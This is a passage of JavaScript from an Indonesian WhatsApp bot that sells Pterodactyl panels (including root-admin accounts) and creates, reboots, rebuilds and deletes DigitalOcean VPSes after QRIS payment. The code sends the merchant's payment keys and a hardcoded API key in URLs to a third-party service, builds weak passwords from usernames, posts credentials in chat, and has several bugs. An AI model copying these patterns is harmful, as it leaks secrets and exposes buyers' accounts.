                  description: "Rp10.000", 
                  id: `${prefix}buypanel unlimited`
                },
                {
                  title: 'Ram 1GB', 
                  description: "Rp1000", 
                  id: `${prefix}buypanel 1gb`
                },
                {
                  title: 'Ram 2GB', 
                  description: "Rp2000", 
                  id: `${prefix}buypanel 2gb`
                },
                {
                  title: 'Ram 3GB', 
                  description: "Rp3000", 
                  id: `${prefix}buypanel 3gb`
                },
                {
                  title: 'Ram 4GB', 
                  description: "Rp4000", 
                  id: `${prefix}buypanel 4gb`
                },      
                {
                  title: 'Ram 5GB', 
                  description: "Rp5000", 
                  id: `${prefix}buypanel 5
                  gb`
                },       
                {
                  title: 'Ram 6GB', 
                  description: "Rp6000", 
                  id: `${prefix}buypanel 6gb`
                },
                {
                  title: 'Ram 7GB', 
                  description: "Rp7000", 
                  id: `${prefix}buypanel 7gb`
                },        
                {
                  title: 'Ram 8GB', 
                  description: "Rp8000", 
                  id: `${prefix}buypanel 8gb`
                },   
                {
                  title: 'Ram 9GB', 
                  description: "Rp9000", 
                  id: `${prefix}buypanel 9gb`
                },       
                {
                  title: 'Ram 10GB', 
                  description: "Rp10.000", 
                  id: `${prefix}buypanel 10gb`
                },                                       
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Ram Server Panel Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
let Obj = {}
let cmd = text.toLowerCase()
if (cmd == "1gb") {
Obj.ram = "1000"
Obj.disk = "1000"
Obj.cpu = "40"
Obj.harga = "1000"
} else if (cmd == "2gb") {
Obj.ram = "2000"
Obj.disk = "1000"
Obj.cpu = "60"
Obj.harga = "2000"
} else if (cmd == "3gb") {
Obj.ram = "3000"
Obj.disk = "2000"
Obj.cpu = "80"
Obj.harga = "3000"
} else if (cmd == "4gb") {
Obj.ram = "4000"
Obj.disk = "2000"
Obj.cpu = "100"
Obj.harga = "4000"
} else if (cmd == "5gb") {
Obj.ram = "5000"
Obj.disk = "3000"
Obj.cpu = "120"
Obj.harga = "5000"
} else if (cmd == "6gb") {
Obj.ram = "6000"
Obj.disk = "3000"
Obj.cpu = "140"
Obj.harga = "6000"
} else if (cmd == "7gb") {
Obj.ram = "7000"
Obj.disk = "4000"
Obj.cpu = "160"
Obj.harga = "7000"
} else if (cmd == "8gb") {
Obj.ram = "8000"
Obj.disk = "4000"
Obj.cpu = "180"
Obj.harga = "8000"
} else if (cmd == "9gb") {
Obj.ram = "9000"
Obj.disk = "5000"
Obj.cpu = "200"
Obj.harga = "9000"
} else if (cmd == "10gb") {
Obj.ram = "10000"
Obj.disk = "5000"
Obj.cpu = "220"
Obj.harga = "10000"
} else if (cmd == "unli" || cmd == "unlimited") {
Obj.ram = "0"
Obj.disk = "0"
Obj.cpu = "0"
Obj.harga = "10000"
} else return m.reply(teks)

const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)

const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = crypto.randomBytes(4).toString('hex')
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": Obj.ram,
"swap": 0,
"disk": Obj.disk,
"io": 500,
"cpu": Obj.cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang = db.users[m.sender].saweria.chat
var tekspanel = `*「 \`PANEL MADE\` 」*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Server Specification*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

> sungsu Terms & Conditions:
|•Expired panel 1 month
|•Save this data as best as possible 
|•15-day purchase guarantee (1x replace) 
|•Warranty claims must bring proof of purchase chat

> Done by sungsu-cpanel 
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
transactionId: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*「 \`PANEL MADE\` 」*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

> sungsu Terms & Conditions:
|•Account expires in 1 month 
|•Save this data as best as possible
|•Don't just delete the server!
|•If you are caught stealing sc, your account will be automatically deleted, no reff!

> Done by sungsu-cpanel 
`
await fs.writeFileSync("./akunpanel.txt", teks)
await conn.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await conn.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return m.reply("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
m.reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
conn.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
m.reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
m.reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
m.reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
m.reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
conn.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
m.reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cekvps": {
async function getDropletInfo() {
try {
const axios = require('axios');
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});
const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Vps Yang Bisa Di Beli Sisa : ${dropletInfo.remainingDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const axios = require('axios');
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'pixiv': case 'pix': {
  if (!text) return m.reply('Masukkan kata kunci!\nContoh: .pixiv hutao')

  await conn.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } })

  try {
    let hasil = await pixiv(text)
    if (!hasil || hasil.length === 0) return m.reply("Gambar tidak ditemukan!")

    let topImages = hasil.slice(0, 10) 
    let slides = []

    for (let img of topImages) {
      let imgBuff = await getBuff(img.url)
      let imgsc = await prepareWAMessageMedia({ image: imgBuff }, { upload: conn.waUploadToServer })

      slides.push({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: `🔍 Pixiv ID: ${img.id}`,
          hasMediaAttachment: true,
          ...imgsc
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: `{
                "display_text": "Buka di Pixiv",
                "url": "https://www.pixiv.net/en/artworks/${img.id}"
              }`
            }
          ]
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: "Powered by Pixiv"
        })
      })
    }

    const msg = await generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.fromObject({
              text: `🔎 Berikut hasil dari *${text}*`
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: slides
            })
          })
        }
      }
    }, {
      userJid: m.sender,
      quoted: m
    })

    conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })

  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err}`)
  }

  await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } })
}
break

case "cvps": {
if (!text) return m.reply(example("hostname"))
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await conn.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*「 \`PANEL MADE\` 」*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Server Specifications*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

> sungsu Terms and Conditions:
|•Expires in 1 month
|•Save data as best as possible 
|•15 day purchase Guaranteed(1x replace)

> Done by sungsu-cpanel 
`
await fs.writeFileSync("akunpanel.txt", teks)
await conn.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

